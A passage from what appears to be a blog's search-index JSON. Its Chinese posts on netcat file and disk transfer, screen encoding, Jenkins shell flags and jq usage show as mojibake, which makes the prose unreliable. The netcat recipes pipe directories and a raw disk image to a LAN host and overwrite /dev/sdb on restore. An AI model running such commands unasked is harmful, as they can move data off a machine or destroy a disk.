é™¤æ–‡ä»¶"},{"content":"ä¸€ã€è¿œç¨‹ä¼ è¾“æ–‡ä»¶å‹ç¼©åŒ…\ntar zcvf - /export/A0 | nc 192.168.86.5 8732 nc -l 8732 \u0026gt; A0.tar.gz æ–¹å‘å€’è¿‡æ¥ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåœ¨æœåŠ¡ç«¯å‹ç¼©æ–‡ä»¶\ntar zcvf - /export/A0 | nc -l -p8732 nc 192.168.86.5 8732 \u0026gt; A0.tar.gz äºŒã€è¿œç¨‹ä¼ è¾“æ•´ä¸ªç›®å½•\ntar cvf - /export/A0 | nc 192.168.86.5 8732 nc -l 8732 | tar xvf - ä¸‰ã€è¿œç¨‹å¤‡ä»½åˆ†åŒºåˆ°ä¸€ä¸ªæ–‡ä»¶\ndd if=/dev/sdb | gzip -c | nc 192.168.86.5 8732 nc -lp 8732 | dd of=/backup/sdb.img.gz å››ã€å°†è¿œç¨‹åˆ†åŒºå¤‡ä»½æ–‡ä»¶æ‹‰åˆ°æœ¬åœ°å¹¶æ¢å¤åˆ†åŒº\ncat /backup/sdb.img.gz | nc 192.168.86.5 8732 nc -lp 8732 | gunzip -c | sudo dd of=/dev/sdb ","permalink":"https://rendoumi.com/posts/20240119-netcat/","summary":"\u003cp\u003eä¸€ã€è¿œç¨‹ä¼ è¾“æ–‡ä»¶å‹ç¼©åŒ…\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zcvf - /export/A0 \u003cspan class=\"p\"\u003e|\u003c/span\u003e nc 192.168.86.5 \u003cspan class=\"m\"\u003e8732\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -l \u003cspan class=\"m\"\u003e8732\u003c/span\u003e \u0026gt; A0.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ–¹å‘å€’è¿‡æ¥ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåœ¨æœåŠ¡ç«¯å‹ç¼©æ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zcvf - /export/A0 \u003cspan class=\"p\"\u003e|\u003c/span\u003e nc -l -p8732\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc 192.168.86.5 \u003cspan class=\"m\"\u003e8732\u003c/span\u003e \u0026gt; A0.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eäºŒã€è¿œç¨‹ä¼ è¾“æ•´ä¸ªç›®å½•\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar cvf - /export/A0 \u003cspan class=\"p\"\u003e|\u003c/span\u003e nc 192.168.86.5 \u003cspan class=\"m\"\u003e8732\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -l \u003cspan class=\"m\"\u003e8732\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e tar xvf -  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‰ã€è¿œç¨‹å¤‡ä»½åˆ†åŒºåˆ°ä¸€ä¸ªæ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/sdb \u003cspan class=\"p\"\u003e|\u003c/span\u003e gzip -c \u003cspan class=\"p\"\u003e|\u003c/span\u003e nc 192.168.86.5 \u003cspan class=\"m\"\u003e8732\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -lp \u003cspan class=\"m\"\u003e8732\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e dd \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/backup/sdb.img.gz  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå››ã€å°†è¿œç¨‹åˆ†åŒºå¤‡ä»½æ–‡ä»¶æ‹‰åˆ°æœ¬åœ°å¹¶æ¢å¤åˆ†åŒº\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /backup/sdb.img.gz \u003cspan class=\"p\"\u003e|\u003c/span\u003e nc 192.168.86.5 \u003cspan class=\"m\"\u003e8732\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -lp \u003cspan class=\"m\"\u003e8732\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e gunzip -c \u003cspan class=\"p\"\u003e|\u003c/span\u003e sudo dd \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/sdb  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"netcatçš„ä¸€äº›è¿œç¨‹ç”¨æ³•"},{"content":"å¾ˆçƒ¦èºçš„é—®é¢˜ï¼ŒTerminal ç»ˆç«¯æ˜¯UTF8ï¼Œæ˜¾ç¤ºæ— é—®é¢˜ã€‚\nå¯æ˜¯è¿è¡Œ screen åå°±ä¹±ç ï¼Œscreen åçš„ env ç¯å¢ƒè·Ÿä¹‹å‰ä¸€æ ·ï¼Œå®Œå…¨æ— é—®é¢˜\nè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š\nåœ¨è‡ªå·±ç”¨æˆ·çš„.screenrcä¸­åŠ ä¸¤å¥\ndefencoding utf-8 encoding utf-8 utf-8 å¾—æŠŠç¯å¢ƒå˜é‡å¸¦åˆ°screenä¸­ï¼Œæ‰è¡Œã€‚\n","permalink":"https://rendoumi.com/posts/20240119-screen_utf/","summary":"\u003cp\u003eå¾ˆçƒ¦èºçš„é—®é¢˜ï¼ŒTerminal ç»ˆç«¯æ˜¯UTF8ï¼Œæ˜¾ç¤ºæ— é—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eå¯æ˜¯è¿è¡Œ screen åå°±ä¹±ç ï¼Œscreen åçš„ env ç¯å¢ƒè·Ÿä¹‹å‰ä¸€æ ·ï¼Œå®Œå…¨æ— é—®é¢˜\u003c/p\u003e\n\u003cp\u003eè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eåœ¨è‡ªå·±ç”¨æˆ·çš„.screenrcä¸­åŠ ä¸¤å¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefencoding utf-8  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eencoding utf-8 utf-8  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¾—æŠŠç¯å¢ƒå˜é‡å¸¦åˆ°screenä¸­ï¼Œæ‰è¡Œã€‚\u003c/p\u003e","title":"Linuxä¸‹Screenä¹±ç "},{"content":"ç¼ºçœjenkinsçš„execute shellçš„æ–¹å¼æ˜¯å¦‚ä¸‹å¸¦ç€å‚æ•°çš„ï¼š\nsh -xe hudsonxxx.sh è¯´æ˜ä¸€ä¸‹ï¼š\n-e æ‰“å¼€å¼€å…³ è¡¨ç¤ºä¸€æ—¦è„šæœ¬ä¸­æœ‰å‘½ä»¤çš„è¿”å›å€¼ä¸ºé0ï¼Œåˆ™è„šæœ¬ç«‹å³é€€å‡ºï¼Œåç»­å‘½ä»¤ä¸å†æ‰§è¡Œ; +e å…³ä¸Šå¼€å…³ -x æ‰“å¼€å¼€å…³ è¡¨ç¤ºæ‰§è¡ŒæŒ‡ä»¤åï¼Œä¼šå…ˆæ˜¾ç¤ºè¯¥æŒ‡ä»¤åŠæ‰€ä¸‹çš„å‚æ•°ã€‚ +x å…³ä¸Šå¼€å…³ è¯¦ç»†è§£é‡Šä¸€ä¸‹ï¼š\nset -e è¡¨ç¤ºä¸€æ—¦è„šæœ¬ä¸­æœ‰å‘½ä»¤çš„è¿”å›å€¼ä¸ºé0ï¼Œåˆ™è„šæœ¬ç«‹å³é€€å‡ºï¼Œåç»­å‘½ä»¤ä¸å†æ‰§è¡Œ; set -x è¡¨ç¤ºæ‰§è¡ŒæŒ‡ä»¤åï¼Œä¼šå…ˆæ˜¾ç¤ºè¯¥æŒ‡ä»¤åŠæ‰€ä¸‹çš„å‚æ•°ã€‚ set -o pipefail è¡¨ç¤ºåœ¨ç®¡é“è¿æ¥çš„å‘½ä»¤åºåˆ—ä¸­ï¼Œåªè¦æœ‰ä»»ä½•ä¸€ä¸ªå‘½ä»¤è¿”å›é0å€¼ï¼Œåˆ™æ•´ä¸ªç®¡é“è¿”å›é0å€¼ï¼Œå³ä½¿æœ€åä¸€ä¸ªå‘½ä»¤è¿”å›0. æ³¨æ„åœ¨å¼•ç”¨nvmä»¥åŠmeteorçš„ç¯å¢ƒä¸­ï¼Œè¦è®¾ç½®set +e å¦åˆ™source nvm.shçš„è¿‡ç¨‹å®¹æ˜“å‡ºé”™ï¼\n","permalink":"https://rendoumi.com/posts/20240119-jenkins_shell/","summary":"\u003cp\u003eç¼ºçœjenkinsçš„execute shellçš„æ–¹å¼æ˜¯å¦‚ä¸‹å¸¦ç€å‚æ•°çš„ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esh -xe hudsonxxx.sh  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¯´æ˜ä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-e æ‰“å¼€å¼€å…³ è¡¨ç¤ºä¸€æ—¦è„šæœ¬ä¸­æœ‰å‘½ä»¤çš„è¿”å›å€¼ä¸ºé0ï¼Œåˆ™è„šæœ¬ç«‹å³é€€å‡ºï¼Œåç»­å‘½ä»¤ä¸å†æ‰§è¡Œ\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e+e å…³ä¸Šå¼€å…³\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-x æ‰“å¼€å¼€å…³ è¡¨ç¤ºæ‰§è¡ŒæŒ‡ä»¤åï¼Œä¼šå…ˆæ˜¾ç¤ºè¯¥æŒ‡ä»¤åŠæ‰€ä¸‹çš„å‚æ•°ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e+x å…³ä¸Šå¼€å…³\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¯¦ç»†è§£é‡Šä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -e è¡¨ç¤ºä¸€æ—¦è„šæœ¬ä¸­æœ‰å‘½ä»¤çš„è¿”å›å€¼ä¸ºé0ï¼Œåˆ™è„šæœ¬ç«‹å³é€€å‡ºï¼Œåç»­å‘½ä»¤ä¸å†æ‰§è¡Œ\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -x è¡¨ç¤ºæ‰§è¡ŒæŒ‡ä»¤åï¼Œä¼šå…ˆæ˜¾ç¤ºè¯¥æŒ‡ä»¤åŠæ‰€ä¸‹çš„å‚æ•°ã€‚ \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -o pipefail  è¡¨ç¤ºåœ¨ç®¡é“è¿æ¥çš„å‘½ä»¤åºåˆ—ä¸­ï¼Œåªè¦æœ‰ä»»ä½•ä¸€ä¸ªå‘½ä»¤è¿”å›é0å€¼ï¼Œåˆ™æ•´ä¸ªç®¡é“è¿”å›é0å€¼ï¼Œå³ä½¿æœ€åä¸€ä¸ªå‘½ä»¤è¿”å›0.  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„åœ¨å¼•ç”¨nvmä»¥åŠmeteorçš„ç¯å¢ƒä¸­ï¼Œè¦è®¾ç½®set +e å¦åˆ™source nvm.shçš„è¿‡ç¨‹å®¹æ˜“å‡ºé”™ï¼\u003c/p\u003e","title":"jenkinsä¸­execute shellçš„æ³¨æ„äº‹é¡¹"},{"content":"æœ€è¿‘è°ƒè¯•Elasticsearchæ¯”è¾ƒå¤šï¼Œè€ç”¨curlæ¥æŸ¥çœ‹æ•°æ®ï¼Œpretty=onå›ºç„¶æ˜¯å¥½ï¼Œå¯æ˜¯å¦‚æœè¦å…·ä½“çœ‹ä¼ å›æ¥çš„jsonæ•°æ®ï¼Œè¿˜æ˜¯ä¸æ–¹ä¾¿ï¼Œå¦å¤–å¦‚æœæƒ³åœ¨shellé‡Œå¤„ç†jsonæ ¼å¼ï¼Œå°±ä¸çŸ¥é“å¦‚ä½•æ˜¯å¥½äº†ã€‚å°±è¢«è¿«æ”¹ç”¨pythonäº†ï¼Œæœ‰æ²¡æœ‰åœ¨shellä¸‹è°ƒè¯•jsonçš„å·¥å…·å‘¢ï¼Ÿ\næœ‰ï¼Œå°±æ˜¯jqï¼Œå®‰è£…so easyï¼š\nwget http://stedolan.github.io/jq/download/linux32/jq (32-bit system) wget http://stedolan.github.io/jq/download/linux64/jq (64-bit system) chmod +x ./jq mv jq /usr/local/bin ç»™ä¸ªjsonæ ·æœ¬æ–‡ä»¶\ncat google.json { \u0026#34;name\u0026#34;: \u0026#34;Google\u0026#34;, \u0026#34;location\u0026#34;: { \u0026#34;street\u0026#34;: \u0026#34;1600 Amphitheatre Parkway\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Mountain View\u0026#34;, \u0026#34;state\u0026#34;: \u0026#34;California\u0026#34;, \u0026#34;country\u0026#34;: \u0026#34;US\u0026#34; }, \u0026#34;employees\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Michael\u0026#34;, \u0026#34;division\u0026#34;: \u0026#34;Engineering\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Laura\u0026#34;, \u0026#34;division\u0026#34;: \u0026#34;HR\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Elise\u0026#34;, \u0026#34;division\u0026#34;: \u0026#34;Marketing\u0026#34; } ] } çœ‹ä¸Šé¢ï¼Œ{}æ‹¬èµ·æ¥çš„æ˜¯å¯¹è±¡ï¼Œå¦‚æœæ˜¯[]æ‹¬èµ·æ¥çš„å°±æ˜¯æ•°ç»„äº†ï¼Œnodejsè¦æ³¨æ„è¿™ä¸€ç‚¹ï¼Œå…¶å®jsonæ˜¯jsçš„Objectçš„å­é›†ã€‚\nè·å–å¯¹è±¡ï¼š\ncat google.json | jq \u0026#39;.name\u0026#39; \u0026#34;Google\u0026#34; è·å–åµŒå¥—å¯¹è±¡ï¼š\ncat google.json | jq \u0026#39;.location.city\u0026#39; \u0026#34;Mountain View\u0026#34; è·å–ä¸€ä¸ªæ•°ç»„çš„å€¼ï¼š\ncat google.json | jq \u0026#39;.employees[0].name\u0026#39; \u0026#34;Michael\u0026#34; è·å–å¯¹è±¡çš„å¤šä¸ªå­—æ®µï¼š\ncat google.json | jq \u0026#39;.location | {street, city}\u0026#39; { \u0026#34;city\u0026#34;: \u0026#34;Mountain View\u0026#34;, \u0026#34;street\u0026#34;: \u0026#34;1600 Amphitheatre Parkway\u0026#34; } å¾ˆç®€å•å§ï¼Œå’Œcurlç»“åˆèµ·æ¥ï¼Œå°±å¯ä»¥åœ¨shellè¿›è¡Œç¼–ç¨‹å¤„ç†jsonæ–‡ä»¶äº†ã€‚\ncurlå’Œjqç»“åˆçš„ä¾‹å­ï¼š\ncurl -s ... | jq . å¦‚æœè¿”å›çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸æƒ³è¦å­—ç¬¦ä¸²çš„å¼•å·ï¼Œ-rå³å¯\ncurl -s ... | jq \u0026#39;.location.city\u0026#39; \u0026#34;Mountain View\u0026#34; curl -s ... | jq -r \u0026#39;.location.city\u0026#39; Mountain View å¦‚æœè¦è®¡ç®—æŸä¸ªæ•°ç»„çš„é•¿åº¦ï¼Œlength\ncurl -s ... | jq \u0026#39;.data | length\u0026#39; æœ€åæ”¾ä¸ŠDocumentï¼š\nhttps://stedolan.github.io/jq/manual/\njqç°åœ¨å·²ç»åˆ°1.7äº†ï¼Œæœ‰å¾ˆå¤šæ–°ç”¨æ³•ï¼Œå¯ä»¥è®¡ç®—ç­‰ç­‰ï¼Œç”¨æ³•å¤§å…¨ï¼š\nhttp://hyperpolyglot.org/json\n","permalink":"https://rendoumi.com/posts/20240119-jq/","summary":"\u003cp\u003eæœ€è¿‘è°ƒè¯•Elasticsearchæ¯”è¾ƒå¤šï¼Œè€ç”¨curlæ¥æŸ¥çœ‹æ•°æ®ï¼Œpretty=onå›ºç„¶æ˜¯å¥½ï¼Œå¯æ˜¯å¦‚æœè¦å…·ä½“çœ‹ä¼ å›æ¥çš„jsonæ•°æ®ï¼Œè¿˜æ˜¯ä¸æ–¹ä¾¿ï¼Œå¦å¤–å¦‚æœæƒ³åœ¨shellé‡Œå¤„ç†jsonæ ¼å¼ï¼Œå°±ä¸çŸ¥é“å¦‚ä½•æ˜¯å¥½äº†ã€‚å°±è¢«è¿«æ”¹ç”¨pythonäº†ï¼Œæœ‰æ²¡æœ‰åœ¨shellä¸‹è°ƒè¯•jsonçš„å·¥å…·å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæœ‰ï¼Œå°±æ˜¯jqï¼Œå®‰è£…so easyï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://stedolan.github.io/jq/download/linux32/jq \u003cspan class=\"o\"\u003e(\u003c/span\u003e32-bit system\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://stedolan.github.io/jq/download/linux64/jq \u003cspan class=\"o\"\u003e(\u003c/span\u003e64-bit system\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod +x ./jq  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv jq /usr/local/bin  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç»™ä¸ªjsonæ ·æœ¬æ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat google.json  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Google\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;location\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"s2\"\u003e\u0026#34;street\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;1600 Amphitheatre Parkway\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"s2\"\u003e\u0026#34;city\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Mountain View\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"s2\"\u003e\u0026#34;state\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;California\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"s2\"\u003e\u0026#34;country\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;US\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;employees\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Michael\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"s2\"\u003e\u0026#34;division\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Engineering\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Laura\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"s2\"\u003e\u0026#34;division\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;HR\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Elise\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"s2\"\u003e\u0026#34;division\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Marketing\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹ä¸Šé¢ï¼Œ{}æ‹¬èµ·æ¥çš„æ˜¯å¯¹è±¡ï¼Œå¦‚æœæ˜¯[]æ‹¬èµ·æ¥çš„å°±æ˜¯æ•°ç»„äº†ï¼Œnodejsè¦æ³¨æ„è¿™ä¸€ç‚¹ï¼Œå…¶å®jsonæ˜¯jsçš„Objectçš„å­é›†ã€‚\u003c/p\u003e\n\u003cp\u003eè·å–å¯¹è±¡ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat google.json \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq \u003cspan class=\"s1\"\u003e\u0026#39;.name\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Google\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè·å–åµŒå¥—å¯¹è±¡ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat google.json \u003cspan 